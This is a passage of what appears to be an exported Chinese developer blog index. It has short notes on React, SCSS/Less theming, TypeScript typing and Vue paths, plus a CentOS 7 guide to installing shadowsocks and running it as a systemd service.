<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>基于问题产生的原因，只要避免上述条件就可以避免这些问题。最简单的解决方案就是将 textNode 包裹在 span 标签内，这样即使被 React 引用的节点被替换为 font 标签，它们依然保留在 DOM 树中。</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">// 情况 1 解决方案</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Welcome</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token punctuation">&#125;</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Something</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token comment">// 情况 2 解决方案</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Something</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token punctuation">&#125;</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">Welcome</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p><a href="https://github.com/facebook/react/issues/11538#issuecomment-390386520">参考资料</a></p>
</blockquote>
]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>google translate</tag>
        <tag>failed to execute &quot;insertBefore&quot; on &quot;node&quot;</tag>
      </tags>
  </entry>
  <entry>
    <title>scss与less主题切换对比</title>
    <url>/2021/05/25/scss%E4%B8%8Eless%E4%B8%BB%E9%A2%98%E5%88%87%E6%8D%A2%E5%AF%B9%E6%AF%94/</url>
    <content><![CDATA[<h2 id="less-实现主题切换的语法"><a href="#less-实现主题切换的语法" class="headerlink" title="less 实现主题切换的语法"></a>less 实现主题切换的语法</h2><pre class="line-numbers language-less" data-language="less"><code class="language-less"><span class="token comment">// 设置主题模板函数</span>
<span class="token selector">.common-theme(<span class="token variable">@backgroundColor</span>, <span class="token variable">@color</span>)</span> <span class="token punctuation">&#123;</span>
  <span class="token selector">.class__A</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token variable">@backgroundColor</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token variable">@color</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 实现主题-亮色</span>
<span class="token selector">.theme-light</span> <span class="token punctuation">&#123;</span>
  <span class="token mixin-usage function">.common-theme</span><span class="token punctuation">(</span>#fff<span class="token punctuation">,</span> #d9d9d9<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 实现主题-暗色</span>
<span class="token selector">.theme-dark</span> <span class="token punctuation">&#123;</span>
  <span class="token mixin-usage function">.common-theme</span><span class="token punctuation">(</span>#000<span class="token punctuation">,</span> #fff<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="scss-实现主题切换的语法"><a href="#scss-实现主题切换的语法" class="headerlink" title="scss 实现主题切换的语法"></a>scss 实现主题切换的语法</h2><h3 id="一、遍历配置"><a href="#一、遍历配置" class="headerlink" title="一、遍历配置"></a>一、遍历配置</h3><pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">// 主题配置</span>
<span class="token property"><span class="token variable">$theme-config</span></span><span class="token punctuation">:</span> <span class="token punctuation">(</span>
  <span class="token property">light</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>
    <span class="token property">backgroundColor</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> #d9d9d9<span class="token punctuation">;</span><span class="token punctuation">,</span>
  <span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token property">dark</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>
    <span class="token property">backgroundColor</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span><span class="token punctuation">,</span>
  <span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">@each</span> <span class="token selector"><span class="token variable">$theme</span>, <span class="token variable">$config</span> in <span class="token variable">$theme-config</span> </span><span class="token punctuation">&#123;</span>
  <span class="token comment">// 属性名使用变量时需要使用#&#123;&#125;包裹</span>
  <span class="token selector">.theme-<span class="token variable">#&#123;$theme&#125;</span> </span><span class="token punctuation">&#123;</span>
    <span class="token selector">.class__A </span><span class="token punctuation">&#123;</span>
      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">map-get</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token string">"backgroundColor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">map-get</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token string">"color"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="二、mixin"><a href="#二、mixin" class="headerlink" title="二、mixin"></a>二、mixin</h3><pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token keyword">@mixin</span> <span class="token function">common-theme</span><span class="token punctuation">(</span><span class="token variable">$backgroundColor</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token selector">.class__A </span><span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token variable">$backgroundColor</span><span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token variable">$color</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 亮色</span>
<span class="token selector">.theme-light </span><span class="token punctuation">&#123;</span>
  <span class="token keyword">@include</span> <span class="token function">common-theme</span><span class="token punctuation">(</span>#fff<span class="token punctuation">,</span> #d9d9d9<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 暗色</span>
<span class="token selector">.theme-dark </span><span class="token punctuation">&#123;</span>
  <span class="token keyword">@include</span> <span class="token function">common-theme</span><span class="token punctuation">(</span>#000<span class="token punctuation">,</span> #fff<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料-<a href="https://blog.csdn.net/bocongbo/article/details/104773028">less、scss 主题切换</a></p>
</blockquote>
]]></content>
      <categories>
        <category>scss</category>
      </categories>
      <tags>
        <tag>scss</tag>
        <tag>less</tag>
        <tag>主题切换</tag>
      </tags>
  </entry>
  <entry>
    <title>scss学习笔记</title>
    <url>/2018/10/21/scss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>&amp;符号代表当前元素</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">#main </span><span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>
    <span class="token selector">a </span><span class="token punctuation">&#123;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
        <span class="token selector"><span class="token parent important">&amp;</span>:hover </span><span class="token punctuation">&#123;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// is compiled to</span>
<span class="token selector">#main </span><span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">#main a </span><span class="token punctuation">&#123;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">#main a:hover </span><span class="token punctuation">&#123;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>scss</category>
      </categories>
      <tags>
        <tag>scss</tag>
      </tags>
  </entry>
  <entry>
    <title>typescript中onchange事件类型</title>
    <url>/2021/05/06/typescript%E4%B8%ADonchange%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p>在 React 框架中使用 Typescript 时，在遇到 DOM 事件时，总会遇到类型问题，最常见的就是 e.target.value 不存在。这时候就需要在回调函数中显式地声明事件类型。</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span>
  <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token parameter">e<span class="token operator">:</span> React<span class="token punctuation">.</span>ChangeEvent<span class="token operator">&lt;</span>HTMLInputElement<span class="token operator">></span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span>
<span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p><a href="https://stackoverflow.com/questions/40676343/typescript-input-onchange-event-target-value">参考资料</a></p>
</blockquote>
]]></content>
      <categories>
        <category>typescript</category>
      </categories>
      <tags>
        <tag>typescript</tag>
        <tag>dom event</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7下shadowsocks服务端的安装配置与自启动</title>
    <url>/2018/04/07/shadowsocks%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%87%AA%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<p>注意：本文所有操作都是默认使用root用户，默认服务器系统为centos7。</p>
<h1 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h1><h2 id="添加epel源"><a href="#添加epel源" class="headerlink" title="添加epel源"></a>添加epel源</h2><p>首先添加epel源，以保证能正确安装shadowsocks的各项依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> epel-release -y
<span class="token comment"># 安装完成后清理配置并重建缓存</span>
yum clean all
yum makecache
<span class="token comment"># 更新</span>
yum update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="安装shadowsocks-1"><a href="#安装shadowsocks-1" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h2><p>首先安装git并用git下载源码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">git</span> -y
<span class="token comment"># git安装完成后下载shadowsocks源码</span>
<span class="token function">git</span> clone https://github.com/shadowsocks/shadowsocks-libev.git
<span class="token comment"># 改变工作目录到刚下载的源码目录</span>
<span class="token builtin class-name">cd</span> shadowsocks-libev
<span class="token comment"># 更新子模块</span>
<span class="token function">git</span> submodule update --init --recursive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<span id="more"></span>
<p>接下来安装shadowsocks的各种依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 要注意输出的安装信息确保所有依赖正确安装，如各别依赖无法自动安装则需手动安装，一般正确更新了epel源都可以自动安装所有依赖</span>
yum <span class="token function">install</span> gcc gettext autoconf libtool automake <span class="token function">make</span> pcre-devel asciidoc xmlto c-ares-devel libev-devel libsodium-devel mbedtls-devel -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>依赖全部成功安装后，用源码编译安装shadowsocks</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意当前工作目录应为刚下载的shadowsocks-libev源码目录</span>
./autogen.sh <span class="token operator">&amp;&amp;</span> ./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span>
<span class="token comment"># make完成后进行安装</span>
<span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h1><h2 id="单用户配置"><a href="#单用户配置" class="headerlink" title="单用户配置"></a>单用户配置</h2><p>在任意目录下建立一个配置文件，例如在root目录下建立ss_serverConfig</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /root/ss_serverConfig
<span class="token punctuation">&#123;</span>
    <span class="token string">"server"</span><span class="token builtin class-name">:</span> <span class="token string">"111.111.111.111"</span>, <span class="token comment"># 你vps的ip地址</span>
    <span class="token string">"server_port"</span><span class="token builtin class-name">:</span> <span class="token number">8388</span>, <span class="token comment"># shadowsocks server要使用的端口，自行设定</span>
    <span class="token string">"local_port"</span><span class="token builtin class-name">:</span> <span class="token number">1080</span>, <span class="token comment"># 本地端口，自行设定</span>
    <span class="token string">"password"</span><span class="token builtin class-name">:</span> <span class="token string">"barfoo!"</span>, <span class="token comment"># 密码，自行设定</span>
    <span class="token string">"timeout"</span><span class="token builtin class-name">:</span> <span class="token number">600</span>, <span class="token comment"># 超时毫秒数</span>
    <span class="token string">"method"</span><span class="token builtin class-name">:</span> <span class="token string">"chacha20-ietf-poly1305"</span> <span class="token comment"># 加密方式，建议优先选chacha20-ietf-poly1305，若客户端不支持，可选aes-256-cfb</span>
<span class="token punctuation">&#125;</span>
<span class="token comment"># 写好配置文件后运行ss-server（非libev版使用ssserver命令）</span>
ss-server -c /root/ss_serverConfig <span class="token comment"># -c 参数是使用配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="多用户配置"><a href="#多用户配置" class="headerlink" title="多用户配置"></a>多用户配置</h2><p>多用户配置文件与单用户不同，我们还是在root下创建一个ss_managerConfig</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /root/ss_managerConfig
<span class="token punctuation">&#123;</span>
    <span class="token string">"server"</span><span class="token builtin class-name">:</span> <span class="token string">"111.111.111.111"</span>, <span class="token comment"># 你vps的ip地址</span>
    <span class="token string">"local_port"</span><span class="token builtin class-name">:</span> <span class="token number">1080</span>, <span class="token comment"># 本地端口，自行设定</span>
    <span class="token string">"timeout"</span><span class="token builtin class-name">:</span> <span class="token number">600</span>, <span class="token comment"># 超时毫秒数</span>
    <span class="token string">"method"</span><span class="token builtin class-name">:</span> <span class="token string">"chacha20-ietf-poly1305"</span>, <span class="token comment"># 加密方式，建议优先选chacha20-ietf-poly1305，若客户端不支持，可选aes-256-cfb</span>
    <span class="token string">"port_password"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"8388"</span><span class="token builtin class-name">:</span> <span class="token string">"barfoo1"</span>, <span class="token comment"># 端口号与密码</span>
        <span class="token string">"8389"</span><span class="token builtin class-name">:</span> <span class="token string">"barfoo2"</span> 
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment"># 多用户配置时，应用ss-manager而不是ss-server</span>
ss-manager -c /root/ss_managerConfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这时我们发现不论是ss-server还是ss-manager都是前台程序，挂在前台执行，监听端口，使用ctrl+c停止后，服务也就停止了。有两个方法使程序运行到后台。</p>
<ol>
<li>程序运行后，我们可以使用ctrl+z键使程序挂起到后台，使用jobs命令查看程序编号，若后台无其他程序一般编号为1，再用bg 1命令，使程序在后台运行。</li>
<li>也可以在程序运行代码的后面加一个&amp;符号，使程序一开始就在后台运行。</li>
</ol>
<p>这时看起来一切都没问题了，可是当我们退出登陆我们的vps后，发现服务又出问题了。原因是后台运行的服务程序与登陆账户是相关的，当登陆账户退出时，通过该账户运行的后台程序也会接到退出信号。这时我们可以使用nohup使程序与登陆账户无关，不再接收账户退出时的退出信号。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> ss-server -c /root/ss_serverConfig <span class="token operator">&amp;</span>
<span class="token comment"># 多用户时则用ss-manager</span>
<span class="token function">nohup</span> ss-manager -c /root/ss_managerConfig <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1 id="shadowsocks开机自启动"><a href="#shadowsocks开机自启动" class="headerlink" title="shadowsocks开机自启动"></a>shadowsocks开机自启动</h1><p>通过上面的文章，我们已经可以使shadowsocks服务良好地运行了，但你一定不想每次重启服务器时都要运行一遍上面的代码。那么我们就可以使用centos7的systemctl将程序注册为一个随着开机自动启动的服务。</p>
<p>注意：该方法基于centos7，不适用centos6。</p>
<p>centos7 设置自启动时，应在/usr/lib/systemd/system下新建一个.service文件，例如ss.service。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /usr/lib/systemd/system/ss.service

<span class="token punctuation">[</span>Unit<span class="token punctuation">]</span>
<span class="token assign-left variable">Description</span><span class="token operator">=</span>shadowsocks manager <span class="token comment"># 服务的描述</span>
<span class="token assign-left variable">After</span><span class="token operator">=</span>network.target <span class="token comment"># 该服务跟在哪个服务后启动</span>

<span class="token punctuation">[</span>Service<span class="token punctuation">]</span>
<span class="token assign-left variable">Type</span><span class="token operator">=</span>forking <span class="token comment"># 启动时的进程行为，forking是以fork形式从父进程创建子进程，子进程创建后父进程退出</span>
<span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/root/startSS <span class="token comment"># 启动服务时执行的命令</span>
<span class="token assign-left variable">PrivateTmp</span><span class="token operator">=</span>true <span class="token comment"># 使用私有临时文件目录</span>

<span class="token punctuation">[</span>Install<span class="token punctuation">]</span>
<span class="token assign-left variable">WantedBy</span><span class="token operator">=</span>multi-user.target <span class="token comment"># 附挂在multi-user.target下</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本来直接在ExecStart处填nohup /usr/local/bin/ss-manager -c /path/to/config/file &amp;<br>但是ExecStart指令串仅接受“指令 参数 参数…”的格式，不能接受&lt;，&gt;，&gt;&gt;，|，&amp;等特殊字符，很多的 bash 语法也不支持。所以，要使用这些特殊的字符时，应直接写入到指令脚本里面。故用将以上命令写在一个bash可执行文件中，例如startSS。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /root/startSS
<span class="token comment">#!/bin/bash</span>
<span class="token function">nohup</span> /usr/local/bin/ss-manager -c /path/to/config/file <span class="token operator">&amp;</span>
<span class="token comment"># 保存文件后增加执行权限</span>
<span class="token function">chmod</span> <span class="token number">754</span> startSS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所有配置文件与脚本都设置完毕，使用systemctl开启服务。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 更改.service文件后，都要重载守护进程更新systemctl</span>
systemctl daemon-reload
<span class="token comment"># 启动服务</span>
systemctl start ss.service
<span class="token comment"># 查看服务状态，若为绿色active(running)则说明服务成功启动</span>
systemctl status ss.service
<span class="token comment"># 设置服务开机自启动</span>
systemctl <span class="token builtin class-name">enable</span> ss.service
<span class="token comment"># 还可使用systemctl restart ss.service重启服务，使用systemctl stop ss.service停止服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>systemctl相关知识详见:</p>
<a href="/2018/04/08/linux%E7%B3%BB%E7%BB%9Fsystemctl%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%91%BD%E4%BB%A4/" title="linux系统systemctl配置与命令">linux系统systemctl配置与命令</a>]]></content>
      <categories>
        <category>shadowsocks</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>多用户</tag>
        <tag>自启动</tag>
      </tags>
  </entry>
  <entry>
    <title>typescript中引入图片的问题</title>
    <url>/2021/05/06/typescript%E4%B8%AD%E5%BC%95%E5%85%A5%E5%9B%BE%E7%89%87%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="Typescript-ts-文件中引入图片时报错，没有正确的类型声明"><a href="#Typescript-ts-文件中引入图片时报错，没有正确的类型声明" class="headerlink" title="Typescript *.ts 文件中引入图片时报错，没有正确的类型声明"></a>Typescript *.ts 文件中引入图片时报错，没有正确的类型声明</h2><p>webpack 都配置完成，但在 ts 文件中引入图片时报错，此时需要在全局 d.ts 文件中增加以下声明</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 全局d.ts文件中，增加声明</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.svg"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.png"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.jpg"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.jpeg"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.gif"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.bmp"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"*.tiff"</span><span class="token punctuation">;</span>

<span class="token comment">// 这样引入图片时就不会报类型错误了</span>
<span class="token keyword">import</span> Img <span class="token keyword">from</span> <span class="token string">"../xxx.png"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>typescript</category>
      </categories>
      <tags>
        <tag>图片</tag>
        <tag>typescript</tag>
      </tags>
  </entry>
  <entry>
    <title>typescript全局类型声明问题</title>
    <url>/2021/05/03/typescript%E5%85%A8%E5%B1%80%E7%B1%BB%E5%9E%8B%E5%A3%B0%E6%98%8E%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="d-ts-中使用-import-语法，导致全局类型失效问题"><a href="#d-ts-中使用-import-语法，导致全局类型失效问题" class="headerlink" title="d.ts 中使用 import 语法，导致全局类型失效问题"></a>d.ts 中使用 import 语法，导致全局类型失效问题</h2><p>一个常见的应用场景，即我们需要扩展 window 全局变量，但 window 的类型声明不包括我们新增的属性，故会通过在全局的 d.ts 文件中书写 window 的 interface 来给 window 增加新的属性，当新属性的类型引用到某个导出的类型时，就要使用 import 语法导入这个类型，一旦使用 import 语法，d.ts 文件就从默认全局转为了默认模块。如何解决全局类型失效的问题呢？</p>
<p>使用 global 的 namespace 即可</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 使用三斜线语法引入类型，该d.ts文件还是全局，但这个文件本身引用不到/ref-path下的类型</span>
<span class="token comment">/// &lt;reference path="/ref-path"></span>
<span class="token keyword">interface</span> <span class="token class-name">window</span> <span class="token punctuation">&#123;</span>
  prop<span class="token operator">:</span> MyType<span class="token punctuation">;</span> <span class="token comment">// Error 虽然MyType在/ref-path下，但该文件中还是读取不到</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 使用import语法引入类型，该d.ts文件默认转为模块，需要使用global命名空间来使某些声明成为全局</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> MyType <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"/ref-path"</span><span class="token punctuation">;</span>
<span class="token keyword">declare</span> global <span class="token punctuation">&#123;</span>
  <span class="token keyword">interface</span> <span class="token class-name">window</span> <span class="token punctuation">&#123;</span>
    prop<span class="token operator">:</span> MyType<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料</p>
<p><a href="https://blog.csdn.net/u013727805/article/details/114758672">*.d.ts 导入 import 其它类型导致全局类型失效问题</a></p>
<p><a href="https://ts.xcatliu.com/basics/declaration-files.html">Typescript 入门教程</a></p>
</blockquote>
]]></content>
      <categories>
        <category>typescript</category>
      </categories>
      <tags>
        <tag>typescript</tag>
        <tag>全局类型</tag>
      </tags>
  </entry>
  <entry>
    <title>vue在服务器环境使用相对路径</title>
    <url>/2018/11/08/vue%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<h1 id="vue-使用相对路径"><a href="#vue-使用相对路径" class="headerlink" title="vue 使用相对路径"></a>vue 使用相对路径</h1><p>当服务器下不单单运行一个项目时，根目录下会有多个项目，vue 使用默认的根路径打包项目时，项目中文件的依赖会去根目录下查找，而出现找不到当前路径下所依赖的 js 与 css 文件的情况，故应在 vue.config.js 中将默认的基础路径设置为相对路径，即可在多项目服务器下正确运行了。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>export <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 默认的baseUrl为"/"</span>
  baseUrl<span class="token operator">:</span> <span class="token string">"./"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="切记！！！-vue-history-模式不要使用相对路径的-baseUrl"><a href="#切记！！！-vue-history-模式不要使用相对路径的-baseUrl" class="headerlink" title="切记！！！ vue history 模式不要使用相对路径的 baseUrl"></a><strong>切记！！！</strong> vue history 模式不要使用相对路径的 baseUrl</h2><blockquote>
<h2 id="相对-baseUrl-的限制"><a href="#相对-baseUrl-的限制" class="headerlink" title="相对 baseUrl 的限制"></a>相对 baseUrl 的限制</h2><p>相对路径的 baseUrl 有一些使用上的限制。在以下情况下，应当避免使用相对 baseUrl:</p>
<ol>
<li>当使用基于 HTML5 history.pushState 的路由时；</li>
<li>当使用 pages 选项构建多页面应用时。</li>
</ol>
</blockquote>
<p>history 模式要对服务器进行配置，详见<a href="https://router.vuejs.org/zh/guide/essentials/history-mode.html#%E5%90%8E%E7%AB%AF%E9%85%8D%E7%BD%AE%E4%BE%8B%E5%AD%90">官方文档</a></p>
